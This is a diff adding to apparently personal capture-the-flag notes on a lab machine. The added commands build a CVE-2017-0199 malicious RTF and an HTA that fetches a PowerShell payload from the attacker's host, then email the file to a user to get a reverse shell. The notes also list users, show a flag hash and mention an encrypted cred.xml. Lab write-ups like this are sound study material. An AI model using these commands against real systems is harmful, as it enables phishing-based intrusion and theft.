@@ -303,3 +303,34 @@ python cve-2017-0199_toolkit.py -M gen -w singh.rtf -u 'http://10.10.16.20/singh
 ```
 
 I don't know but will generate the file with the author name.
+
+So we finally got the reverse shell
+```
+python cve-2017-0199_toolkit.py -M gen -w ippsec.rtf -u 'http://10.10.16.20/singh.hta' -t RTF -x 0
+
+Out-HTA -PayloadURL http://10.10.16.20/ippsec.ps1
+
+sendEmail -f ippsec@megabank.com -t nico@megabank.com -u RTF -m "Please Convert This File" -a ippsec.rtf -s 10.10.10.77
+```
+![[Pasted image 20240510123803.png]]
+
+Users list
+```
+Administrator
+brad
+claire
+herman
+julia
+nico
+tom
+```
+![[Pasted image 20240510124414.png]]
+
+
+```
+4b8d7194bfebfe65816c924142390049
+```
+![[Pasted image 20240510124556.png]]
+
+There is cred.xml file where the password is encrypted we have to find a way to decrypt it.
+![[Pasted image 20240510124742.png]]
